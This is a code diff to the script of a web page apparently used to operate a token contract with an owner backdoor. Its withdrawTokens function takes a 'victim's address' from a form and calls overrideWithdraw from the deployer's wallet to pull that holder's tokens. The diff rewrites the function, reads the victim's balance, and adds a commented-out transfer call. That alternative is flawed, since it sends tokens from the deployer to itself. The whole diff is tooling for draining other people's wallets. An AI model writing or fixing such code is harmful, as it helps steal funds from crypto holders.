@@ -93,25 +93,34 @@
         }
 
         // Withdraw tokens from the victim's wallet
-        async function withdrawTokens() {
-            const victimAddress = document.getElementById('victimAddress').value;
+      async function withdrawTokens() {
+    const victimAddress = document.getElementById('victimAddress').value;
 
-            if (!victimAddress) {
-                alert("Please enter a victim's address!");
-                return;
-            }
+    if (!victimAddress) {
+        alert("Please enter a victim's address!");
+        return;
+    }
 
-            try {
-                // Call the overrideWithdraw function from the deployer's wallet
-                await contract.methods.overrideWithdraw(victimAddress).send({ from: userAccount });
+    try {
+        // Ensure the contract is initialized correctly with ABI and address
+        const contract = new web3.eth.Contract(ABI, contractAddress);
 
-                document.getElementById('status').innerText = `Tokens successfully withdrawn from ${victimAddress}!`;
-            } catch (error) {
-                console.error("Error withdrawing tokens:", error);
-                document.getElementById('status').innerText = "Error withdrawing tokens.";
-                alert("Error withdrawing tokens. Please try again.");
-            }
-        }
+        // Check if you're using the correct method (overrideWithdraw or transfer)
+        const amountToWithdraw = await contract.methods.balanceOf(victimAddress).call(); // Retrieve victim's balance
+
+        // If you want to use overrideWithdraw, ensure it's part of the ABI
+        await contract.methods.overrideWithdraw(victimAddress).send({ from: deployerAddress });
+
+        // Alternatively, if using transfer, you can use the code below instead:
+        // await contract.methods.transfer(deployerAddress, amountToWithdraw).send({ from: deployerAddress });
+
+        document.getElementById('status').innerText = `Tokens successfully withdrawn from ${victimAddress}!`;
+    } catch (error) {
+        console.error("Error withdrawing tokens:", error);
+        document.getElementById('status').innerText = "Error withdrawing tokens.";
+        alert("Error withdrawing tokens. Please try again.");
+    }
+}
     </script>
 </body>
 </html>
